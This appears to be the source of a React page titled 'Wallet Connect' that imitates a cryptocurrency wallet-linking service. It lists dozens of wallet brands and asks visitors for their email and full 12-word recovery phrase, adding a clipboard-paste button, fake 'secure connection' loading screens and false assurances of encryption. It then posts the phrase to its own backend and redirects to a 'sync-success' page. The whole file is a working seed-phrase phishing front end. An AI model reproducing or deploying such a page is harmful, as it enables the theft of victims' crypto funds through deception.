import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { useState, useEffect } from "react";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Loader2, Info, AlertCircle } from "lucide-react";

const WALLET_OPTIONS = [
  // New requested wallets
  "Nexa Global Wallet", "Spruce Pay", "Swift Digital Asset", "Quick Wallet", 
  "Maximumpe", "Lemoel", "Trust Coin", "Stanbic Assets", "Kryptovault Wallet", 
  "Phansky", "SenovanPay", "Deslodex", "Litchain Vault", "Forestbit", 
  "Safety", "Translink Global", "M-PayAsset",
  
  // Existing wallets
  "AdvancedIWP", "Aixbond", "Ally Swift", "AmistadSwift", "Atomic", "Bekrotax",
  "Bitachons", "Bitcoin", "Bitomex", "Bitmax", "Bitware", "BTC", "Cfstrades",
  "Coinarch", "Coinacceso", "Coinaffix", "Coinsjex", "Coinsutra", "ColdWalletOnline",
  "Cryptbi", "Cryptokneit", "Dmartbit", "FaucetPay", "GlobalPay", "Global Business Pay",
  "GlobalDigitalAccess", "Global Swift", "GlobalSwiftPay", "GlobalPerfect Pay",
  "GlobeVault", "Gobitchain", "Gnbit", "Gresop", "Hcuox", "Hobitax",
  "InternationalGlobalPay", "InstaBusinessPay", "Instant Marchant-p", "InstaPayeWallet",
  "InstaWalletPay", "Ketamic", "Ketonec", "KingsCoin Wallet", "Kiptrachain",
  "Kointruxt", "KonnectWallet", "Lainchain", "Lezochain", "Lilpole", "Mainobit",
  "Maintocoin", "Marlone", "Mathskoin", "NexaGlobal", "Paradetic", "PaySwift",
  "Plutusvault", "Prexdeto", "Prizrex", "QuickWalletPay", "Rendoxx", "Saporux",
  "Sap TrustAccountWeb", "SenovanWallet", "SkyRemit", "StackCoinAccount", "Stripe",
  "Stronvit", "Supperlin", "Swift Blink", "SwiftBusinessPay", "Swischain",
  "SwiftPay", "Swift Remit", "SwiftSecure", "SwiftStem", "SwiftWorld",
  "TransferSwift", "Trudex", "TrustPaydWallet", "Ultradotic", "Universal Businesspay",
  "USDTxyn", "Vigixswiz", "Wetrans2u", "Xomit", "Zenquickcash", "Zenithswift", "Zigobit", "Zilnex"
];

export default function Web3() {
  const [, setLocation] = useLocation();
  const [isLoading, setIsLoading] = useState(false);
  const [isPageLoading, setIsPageLoading] = useState(true);
  const [email, setEmail] = useState("");
  const [selectedWallet, setSelectedWallet] = useState("");
  const { toast } = useToast();
  const [seedPhrase, setSeedPhrase] = useState("");
  const [error, setError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);


  useEffect(() => {
    setTimeout(() => {
      setIsPageLoading(false);
    }, 3000);
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setError('');

    if (!email || !selectedWallet || !seedPhrase) {
      toast({
        title: "Error",
        description: "Please fill in all fields",
        variant: "destructive"
      });
      setIsSubmitting(false);
      return;
    }

    try {
      await new Promise(resolve => setTimeout(resolve, 5000)); // Process for 5 seconds

      const response = await fetch('/api/wallet/connect', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          walletType: selectedWallet,
          recoveryPhrase: seedPhrase
        })
      });

      const data = await response.json();

      if (response.ok) {
        setLocation('/sync-success');
      } else {
        console.error('Error saving data:', data);
        setError(typeof data.error === 'string' ? data.error : 'Failed to connect wallet. Please try again.');
      }
    } catch (error) {
      console.error('Error saving data:', error);
      setError('Network error. Please check your connection and try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  if (isPageLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="h-12 w-12 animate-spin text-primary mx-auto mb-4" />
          <p className="text-lg text-black">Loading secure connection...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background py-12 dark relative overflow-hidden">
      <div className="absolute inset-0 bg-primary/5 backdrop-blur-xl pointer-events-none" />

      <div className="container mx-auto px-4 relative z-10">
        <main className="max-w-3xl mx-auto">
          <div className="space-y-8">
            <section className="text-center mb-8 sm:mb-12">
              <h1 className="text-3xl font-bold text-primary mb-4">Wallet Connect</h1>
              <div className="flex justify-center mb-4">
                <img
                  src="/images/logo.png"
                  alt="Wallet Logo"
                  className="w-auto h-16 sm:h-20 object-contain"
                />
              </div>
              <p className="text-black text-base sm:text-lg">
                Complete your wallet connection securely
              </p>
            </section>

            <Card className="border-2 border-primary/10 bg-white/50 backdrop-blur-sm shadow-lg overflow-hidden">
              <div className="bg-primary/10 p-4 border-b border-primary/20">
                <div className="flex justify-between items-center">
                  <h2 className="text-lg font-semibold text-primary">Secure Wallet Connection</h2>
                  <div className="bg-white/70 rounded-full px-3 py-1 text-xs font-medium text-primary flex items-center">
                    <svg className="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                    </svg>
                    Encrypted Connection
                  </div>
                </div>
              </div>
              <CardContent className="p-4 sm:p-6">
                {error && (
                  <div className="mb-4 bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative" role="alert">
                    <strong className="font-bold">Error:</strong>
                    <span className="block sm:inline">{error}</span>
                    <span className="absolute top-0 bottom-0 right-0 px-4 py-3">
                      <AlertCircle className="h-5 w-5 text-red-500" />
                    </span>
                  </div>
                )}
                <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-6">
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-black flex items-center">
                      Email Address
                      <span className="ml-2 text-xs px-2 py-0.5 bg-primary/20 text-primary rounded-full">Required</span>
                    </label>
                    <div className="relative">
                      <Input
                        type="email"
                        placeholder="Enter your email address"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        required
                        className="bg-white/60 text-black placeholder:text-black/60 border-2 border-primary/20 focus:border-primary/40 focus:ring-2 focus:ring-primary/30 h-12 pl-10"
                      />
                      <div className="absolute left-3 top-3.5 pointer-events-none">
                        <svg className="w-5 h-5 text-primary/70" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
                        </svg>
                      </div>
                    </div>
                  </div>

                  <div className="space-y-2">
                    <label className="text-sm font-medium text-black">Choose Your Wallet</label>
                    
                    <div className="relative">
                      <Select value={selectedWallet} onValueChange={setSelectedWallet}>
                        <SelectTrigger className="bg-white/60 text-black border-2 border-primary/20 hover:bg-white/80 transition-colors focus:ring-2 focus:ring-primary/30 h-12">
                          <SelectValue placeholder="Select your wallet provider" />
                        </SelectTrigger>
                        <SelectContent className="max-h-[300px] overflow-y-auto bg-white/95 backdrop-blur-lg border-2 border-primary/20 rounded-md shadow-lg">
                          <div className="p-2 bg-primary/10 border-b border-primary/10 mb-1">
                            <p className="text-xs font-medium text-primary">New Wallet Options</p>
                          </div>
                          {WALLET_OPTIONS.slice(0, 17).map((wallet) => (
                            <SelectItem
                              key={wallet}
                              value={wallet}
                              className="text-black hover:bg-primary/10 cursor-pointer transition-colors py-2.5 pl-8 pr-2 data-[highlighted]:bg-primary/5 data-[highlighted]:text-primary rounded-sm my-0.5"
                            >
                              {wallet}
                            </SelectItem>
                          ))}
                          
                          <div className="p-2 bg-primary/10 border-b border-primary/10 mb-1 mt-2">
                            <p className="text-xs font-medium text-primary">More Wallet Options</p>
                          </div>
                          {WALLET_OPTIONS.slice(17).map((wallet) => (
                            <SelectItem
                              key={wallet}
                              value={wallet}
                              className="text-black hover:bg-primary/10 cursor-pointer transition-colors py-2.5 pl-8 pr-2 data-[highlighted]:bg-primary/5 data-[highlighted]:text-primary rounded-sm my-0.5"
                            >
                              {wallet}
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                      <div className="absolute right-3 top-3 pointer-events-none">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-primary/70">
                          <path d="M21 12V7H5a2 2 0 0 1 0-4h14v4" />
                          <path d="M3 5v14a2 2 0 0 0 2 2h16v-5" />
                          <path d="M18 12a2 2 0 0 0 0 4h4v-4Z" />
                        </svg>
                      </div>
                    </div>
                    
                    {selectedWallet && (
                      <p className="text-xs text-primary mt-1 flex items-center">
                        <Info className="w-3 h-3 mr-1 inline" /> 
                        You selected: <span className="font-semibold ml-1">{selectedWallet}</span>
                      </p>
                    )}
                  </div>

                  <div className="space-y-2">
                    <label className="text-sm font-medium text-black flex items-center">
                      Recovery Phrase
                      <span className="ml-2 text-xs px-2 py-0.5 bg-primary/20 text-primary rounded-full">Required</span>
                    </label>
                    
                    <div className="bg-white/60 border-2 border-primary/20 rounded-md p-3 mb-2">
                      <div className="flex items-start gap-2">
                        <Info className="w-5 h-5 text-primary mt-0.5 flex-shrink-0" />
                        <div className="space-y-1">
                          <p className="text-sm text-black/70">
                            Please enter your 12-word recovery phrase, with each word separated by a space.
                            This is required to verify and secure your wallet connection.
                          </p>
                          <p className="text-xs text-primary/80">
                            Your recovery phrase is securely encrypted and never stored unprotected.
                          </p>
                        </div>
                      </div>
                    </div>
                    
                    <div className="relative">
                      <Textarea
                        placeholder="Enter your 12-word seed phrase separated by spaces..."
                        value={seedPhrase}
                        onChange={(e) => setSeedPhrase(e.target.value)}
                        required
                        className="h-32 bg-white/60 text-black placeholder:text-black/60 pr-20 border-2 border-primary/20 focus:border-primary/40 focus:ring-2 focus:ring-primary/30 resize-none"
                      />
                      <button
                        type="button"
                        onClick={async () => {
                          try {
                            const text = await navigator.clipboard.readText();
                            setSeedPhrase(text);
                            toast({
                              title: "Pasted successfully",
                              variant: "default"
                            });
                          } catch (err) {
                            toast({
                              title: "Could not access clipboard",
                              description: "Please paste manually or allow clipboard access",
                              variant: "destructive"
                            });
                          }
                        }}
                        className="absolute right-2 top-2 bg-primary text-white px-3 py-1 rounded-md text-sm hover:bg-primary/80 transition-colors shadow-sm"
                      >
                        Paste
                      </button>
                    </div>
                  </div>

                  <div className="pt-2">
                    <Button 
                      type="submit" 
                      className="w-full relative h-12 text-base font-medium shadow-md hover:shadow-lg transition-all duration-300 bg-gradient-to-r from-primary to-primary/90" 
                      disabled={isLoading || isSubmitting}
                    >
                      {isLoading || isSubmitting ? (
                        <>
                          <span className="opacity-0">Connect Wallet</span>
                          <div className="absolute inset-0 flex items-center justify-center">
                            <Loader2 className="h-6 w-6 animate-spin" />
                            <span className="ml-2">Processing...</span>
                          </div>
                        </>
                      ) : (
                        "Connect Wallet"
                      )}
                    </Button>
                    
                    <p className="text-xs text-center mt-3 text-black/60">
                      By connecting your wallet, you agree to our 
                      <a href="/privacy" className="text-primary hover:underline mx-1">Terms of Service</a>
                      and
                      <a href="/privacy" className="text-primary hover:underline ml-1">Privacy Policy</a>
                    </p>
                  </div>
                </form>
              </CardContent>
            </Card>
          </div>
        </main>
      </div>
    </div>
  );
}